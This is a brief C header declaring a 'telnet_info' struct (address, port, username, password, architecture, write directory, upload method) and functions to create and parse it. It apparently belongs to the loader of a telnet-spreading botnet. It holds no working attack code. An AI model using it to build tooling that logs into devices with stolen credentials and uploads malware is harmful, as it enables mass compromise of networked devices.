#pragma once

#include "includes.h"

struct telnet_info {
    ipv4_t addr;
    port_t port;
    char user[32];
    char pass[32];
    char arch[16];
    char writedir[32];
    BOOL has_auth;
    BOOL has_arch;
    int upload_method;
};

struct telnet_info *telnet_info_new(char *, char *, char *, ipv4_t, port_t, struct telnet_info *);
struct telnet_info *telnet_info_parse(char *, struct telnet_info *);